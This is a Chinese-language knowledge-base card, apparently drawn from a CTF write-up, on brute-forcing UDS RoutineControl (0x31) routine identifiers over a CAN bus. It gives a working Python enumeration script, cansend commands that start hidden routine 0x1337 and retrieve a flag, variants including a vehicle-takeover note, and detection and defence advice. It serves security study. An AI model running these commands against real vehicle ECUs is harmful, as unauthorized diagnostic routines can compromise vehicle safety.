---
id: iot-protocol-uds-routinecontrol-rid-bruteforce
title: UDS RoutineControl 0x31 例程 ID 爆破：枚举隐藏 routineIdentifier 并执行取结果
type: scenario
domain: iot
path: iot/protocol
technique: uds-routinecontrol-rid-bruteforce
tags:
- iot
- automotive
- can-bus
- uds
- isotp
- brute-force
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V131
  verified_at: '2026-11-06T05:51:03+08:00'
  notes: 已对照原文与11张图片核对：0x31 RoutineControl 请求 04 31 01 i j、以 037f3131（7F 31 31）为非命中判定、命中 0x1337 后用 cansend 7E0#0431011337000000 与 0431031337000000 启动/取结果、补流控 3000000000000000 取回 bh{c0controll1ng_th3_r0ut1nes} 的流程与原文一致；原文为 VSEC Harborbay 仿真环境。未在实车/本机复跑。
url: /docs/iot/protocol/iot-protocol-uds-routinecontrol-rid-bruteforce/
draft: false
kb_aliases:
- UDS RoutineControl
- RID 爆破
- routineIdentifier 枚举
- 0x31 例程控制
- '0x1337'
---

## 一句话结论

UDS 0x31 RoutineControl 的 routineIdentifier 是 16 位可枚举空间：ECU 对未定义 RID 返回否定响应 `7F 31 31`（requestOutOfRange），对已定义 RID 返回正响应；遍历 0x0000–0xFFFF 即可发现隐藏例程（本例为 0x1337），再用子功能 0x01 启动、0x03 读取结果，无需认证即可执行未授权例程并取回其输出（CTF 中直接拿到 flag）。

## 原理

- UDS（ISO 14229）0x31 服务 RoutineControl 用于启动/停止/查询 ECU 内部例程；请求格式为 `31 <subFunction> <RID_hi> <RID_lo> [routineControlOptionRecord]`，子功能 0x01=startRoutine、0x02=stopRoutine、0x03=requestRoutineResults。
- routineIdentifier 由厂商定义，标准不要求公开完整清单；很多 ECU 只对已实现的 RID 返回正响应（`71 <subFunction> <RID> ...`），对未实现/越界 RID 返回 `7F 31 31`（NRC 0x31 requestOutOfRange）。这种“已定义/未定义”的可区分性使 16 位 RID 空间可被枚举。
- 默认会话下 RoutineControl 往往不要求 0x27 SecurityAccess；即使部分 RID 要求，枚举也能先找出所有存在的 RID，再针对高价值 RID 做 0x27 绕过。
- UDS 长报文经 ISO-TP（ISO 15765-2）承载：单帧 PCI 以 0 开头；多帧响应首帧以 1 开头，需要接收方回送流控帧 `30 <BS> <STmin>` 后才继续发送连续帧（PCI 2x）。本例请求只有 4 字节，单帧即可；读取结果的多帧响应需要补发 `30 00 00 00 00 00 00 00`。
- 攻击成立的根本原因是诊断服务暴露在可物理/逻辑接入的 CAN 总线上，且 RoutineControl 缺少会话/认证/白名单约束；ECU 把“例程存在性”通过不同 NRC 暴露出来，等于提供了 RID 枚举 oracle。

## 触发条件

- 能向目标 CAN 总线发送诊断帧（OBD-II Pin 6/14、网关诊断口、车机/台架 SocketCAN 接口）。
- 已知诊断请求/响应地址（常见 11 位：请求 0x7E0、响应 0x7E8；或 0x7E1/0x7E9 等），波特率匹配。
- 目标 ECU 实现 UDS 0x31，且目标 RID 不要求 0x27，或已获得/绕过 SecurityAccess。
- 总线未对诊断帧做网关过滤/IDS 阻断。

## 利用步骤

1. 确认诊断链路：`candump` 观察 0x7E0/0x7E8 或 0x7E1/0x7E9 流量；发送单帧 `04 31 01 00 00` 测试是否有响应。
2. 枚举 RID：对 hi/lo 各 0x00–0xFF 发送 `04 31 01 <hi> <lo>`，读取响应；把 `7F 31 31`（requestOutOfRange）视为“未定义”跳过，其余响应（正响应 `71 01 ...` 或 0x33/0x22 等其它 NRC）记录为候选。
3. 对候选 RID 发送 startRoutine `04 31 01 <hi> <lo>`；若返回多帧首帧，发送流控 `30 00 00 00 00 00 00 00`，收齐连续帧。
4. 发送 requestRoutineResults `04 31 03 <hi> <lo>`，同样处理多帧响应，读取例程输出/状态。
5. 记录结果（本例 0x1337 的 start + results 返回 flag）；测试后按需 stopRoutine `31 02` 或复位 ECU。

## PoC

```python
import can, binascii

bus = can.Bus(interface="socketcan", channel="vcan0")
for i in range(0x100):
    for j in range(0x100):
        msg = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8,
                          data=[0x04, 0x31, 0x01, i, j, 0x00, 0x00, 0x00])
        bus.send(msg, timeout=0.2)
        resp = bus.recv(timeout=0.5)
        if resp is None:
            continue
        hex_resp = binascii.hexlify(resp.data).decode()
        if hex_resp != "037f3131":   # 非 requestOutOfRange => 该 RID 存在
            print("candidate RID:", hex(i), hex(j), hex_resp)
bus.shutdown()
```

```bash
# 命中 RID 0x1337 后：启动例程、读取结果、补流控
cansend vcan0 7E0#0431011337000000
cansend vcan0 7E0#0431031337000000
cansend vcan0 7E0#3000000000000000
# 观察返回：本例得到 bh{c0ntroll1ng_th3_r0ut1nes}
```

> 在繁忙总线上应把响应过滤到诊断响应 ID（如 0x7E8），并匹配 `7F 31` / `71 31`，避免 `bus.recv()` 收到无关帧导致误判。

## 变体与关联

- 变体：只枚举厂商常见 RID 段（如 0x0001–0x00FF、0x0200–0x02FF）以减少总线噪声；29 位诊断寻址；CAN FD 承载 ISO-TP。
- 变体：RID 命中后若返回 0x33 securityAccessDenied，先走 0x27 Seed/Key（见关联卡）。
- 变体：0x31 0x0200 在部分车型用于停发周期报文，配合 CAN 注入可接管车辆（见关联卡）。
- 关联：[[iot-protocol-uds-routinecontrol-can-injection-takeover]]、[[ctf-crypto-uds-securityaccess-seed-key-recovery]]、[[iot-protocol-can-arbitration-id-discovery-spoofing]]。

## 检测与防御

- 检测：短时间内大量 0x31 请求、RID 连续递增/遍历、NRC 0x31 比例异常；同一诊断地址出现非诊断设备。
- 防御：RoutineControl 限定在扩展会话 + SecurityAccess 后执行；网关过滤非授权诊断源；诊断接口物理保护与访问日志；对敏感例程做白名单/速率限制。
- 测试：在台架/模拟器验证，避免在实车执行未知例程；执行后复位并确认 ECU 状态。
